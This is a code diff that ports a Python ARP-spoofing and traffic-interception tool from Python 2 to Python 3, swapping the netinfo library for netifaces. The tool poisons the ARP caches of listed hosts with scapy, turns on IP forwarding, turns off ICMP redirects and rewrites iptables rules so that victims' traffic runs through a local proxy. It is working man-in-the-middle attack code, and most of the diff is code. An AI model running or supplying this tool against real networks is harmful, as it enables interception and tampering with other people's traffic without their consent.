@@ -8,21 +8,21 @@ import socket
 import proxy
 
 try:
-	import netinfo
+	import netifaces
 except ImportError:
-	print "[!] Error: python-netinfo not found"
+	print("[!] Error: python3 pakage netifaces not found, please run 'pip3 install netifaces'")
 	sys.exit(1)
 try:
 	import netaddr
 except ImportError:
-	print "[!] Error: python-netaddr not found"
+	print("[!] Error: python3 pakage netaddr not found, please run 'pip3 install netaddr'")
 	sys.exit(1)
 try:
 	import logging
 	logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 	from scapy.all import Ether, ARP, IP, ICMP, sr1, conf as scapy_conf, sendp as scapy_send
 except ImportError:
-	print "[!] Error: python-scapy not found"
+	print("[!] Error: python3 pakage scapy not found, please run 'pip3 install scapy'")
 	sys.exit(1)
 
 def main():
@@ -75,23 +75,17 @@ def main():
 	proxy_threads = []
 	 
 	try:
-		config.cfg.args.local_ip = netinfo.get_ip(config.cfg.args.iface)
+		config.cfg.args.local_ip = get_ip_address(config.cfg.args.iface)
+		config.cfg.args.local_mac = get_mac_address(config.cfg.args.iface)
+		config.cfg.args.router = get_default_gateway(config.cfg.args.iface)
 	except:
-		print "[!] Error: Interface %s not found" % config.cfg.args.iface
-		sys.exit(0)
-
-	for route in netinfo.get_routes():
-		if route['dest'] == '0.0.0.0':
-			config.cfg.args.router = route['gateway']
-
-	if config.cfg.args.router == None:
-		print "Error: could not detect default gateway"
+		print("[!] Error: Interface %s not found" % config.cfg.args.iface)
 		sys.exit(0)
 
 	try:
 		config.cfg.args.levels = [int(x) for x in config.cfg.args.levels.split(',')]
 	except:
-		print "[!] Invalid level specified."
+		print("[!] Invalid level specified.")
 		sys.exit()
 
 	# Using upstream proxy
@@ -109,7 +103,7 @@ def main():
 			s.connect((config.cfg.args.proxy[0], config.cfg.args.proxy[1]))
 			s.close()
 		except Exception as e: 
-			print "[!] Error: Unable to connect to proxy."
+			print("[!] Error: Unable to connect to proxy.")
 			s.close()
 			sys.exit()
 
@@ -126,10 +120,10 @@ def main():
 		try:
 			port = int(port)
 		except:
-			print "Wrong port"
+			print("Wrong port")
 			sys.exit()
 	
-		print "[*] Starting proxy on  %s:%d..." % (config.cfg.args.local_ip, port)
+		print("[*] Starting proxy on  %s:%d..." % (config.cfg.args.local_ip, port))
 		
 		t = proxy.ProxyThread(config.cfg.args.local_ip, port)
 		proxy_threads.append(t)
@@ -138,12 +132,12 @@ def main():
 	# Configure iptables
 	if config.cfg.args.nofw == False:
 		if os.getuid() != 0:
-			print "[!] Error: Must run as root to auto-configure routing and iptables rules"
+			print("[!] Error: Must run as root to auto-configure routing and iptables rules")
 			sys.exit(0)
 		else:
 			conf_ip_forward()
 
-	config.cfg.my = (netinfo.get_ip(config.cfg.args.iface), netinfo.get_hwaddr(config.cfg.args.iface))
+	config.cfg.my = (config.cfg.args.local_ip, config.cfg.args.local_mac)
 	config.cfg.router = (config.cfg.args.router, '')
 	config.cfg.clients = {}
 
@@ -151,7 +145,7 @@ def main():
 	if config.cfg.args.noarp == False:
 		scapy_conf.iface = config.cfg.args.iface
 
-		print "[*] Poisoning ARP caches..."
+		print("[*] Poisoning ARP caches...")
 		for addr in config.cfg.args.ip_list:
 			
 			# exclude myself and router
@@ -167,11 +161,11 @@ def main():
 			time.sleep(1)
 
 	except KeyboardInterrupt:
-		print "\r\nKilling ARP Poisoning threads..."
+		print("\r\nKilling ARP Poisoning threads...")
 		for t in arp_threads:
 			t.kill()
 
-		print "Killing Proxy threads..."
+		print("Killing Proxy threads...")
 		for t in proxy_threads:
 			t.server.shutdown()
 
@@ -196,7 +190,7 @@ class ArpPoisonThread(threading.Thread):
 
 	def send(self, hwsrc, psrc, pdst):
 		if config.cfg.args.verbose:
-			print "\n>>> to: %-15s > ARP %-15s who-has %s" % (psrc, pdst, hwsrc),
+			print(">>> to: %-15s > ARP %-15s who-has %s" % (psrc, pdst, hwsrc))
 
 		packet = Ether()/ARP(op="who-has", hwsrc=hwsrc, psrc=psrc, pdst=pdst)
 		scapy_send(packet, verbose=0)
@@ -210,7 +204,7 @@ def conf_ip_forward():
 	config.cfg.init_redir = open("/proc/sys/net/ipv4/conf/" + config.cfg.args.iface + "/send_redirects").read().strip()
 
 	# Enable IP forwarding and disable ICMP redirects
-	print "[i] Enabling IP forward..."
+	print("[i] Enabling IP forward...")
 	f = open("/proc/sys/net/ipv4/ip_forward", "w")
 	f.write('1')
 	f.close()
@@ -218,7 +212,7 @@ def conf_ip_forward():
 	f.write('0')
 	f.close()
 
-	print "[i] Configuring iptables rules..."
+	print("[i] Configuring iptables rules...")
 	os.system("/sbin/iptables --flush")
 	os.system("/sbin/iptables -t nat --flush")
 	os.system("/sbin/iptables --zero")
@@ -231,7 +225,7 @@ def conf_ip_forward():
 
 def restore_initial_state():
 
-	print "[i] Restoring IP forward initial state..."
+	print("[i] Restoring IP forward initial state...")
 	f = open("/proc/sys/net/ipv4/ip_forward", "w")
 	f.write(config.cfg.init_ipfwd)
 	f.close()
@@ -239,17 +233,50 @@ def restore_initial_state():
 	f.write(config.cfg.init_redir)
 	f.close()
 
-	print "[i] Restoring iptables initial state..."
+	print("[i] Restoring iptables initial state...")
 	os.system("/sbin/iptables --flush")
 	os.system("/sbin/iptables -t nat --flush")
 	os.system("/sbin/iptables --zero")
 
 def clean_exit():
-	print ""
+	print()
 	#arp_poison_restore()
 	restore_initial_state()
-	print "Exiting..."
+	print("Exiting...")
 	sys.exit(1)
+
+def get_ip_address(interface):
+	try:
+		addrs = netifaces.ifaddresses(interface)
+		if netifaces.AF_INET in addrs:
+			ip_address = addrs[netifaces.AF_INET][0]['addr']
+			return ip_address
+	except Exception as e:
+		print(f"Error getting IP address for {interface}: {e}")
+		return None
+
+def get_mac_address(interface):
+	try:
+		if netifaces.AF_LINK in netifaces.ifaddresses(interface):
+			mac_address = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr']
+			return mac_address
+	except Exception as e:
+		print(f"Error getting MAC address for {interface}: {e}")
+		return None
+
+def get_default_gateway(interface):
+	try:
+		gateway = None
+		gws = netifaces.gateways()
+		if netifaces.AF_INET in gws:
+			for gw in gws[netifaces.AF_INET]:
+				if gw[1] == interface:
+					gateway = gw[0]
+					break
+		return gateway
+	except Exception as e:
+		print(f"Error getting default gateway for {interface}: {e}")
+		return None
 
 if __name__ == '__main__':
 	main()
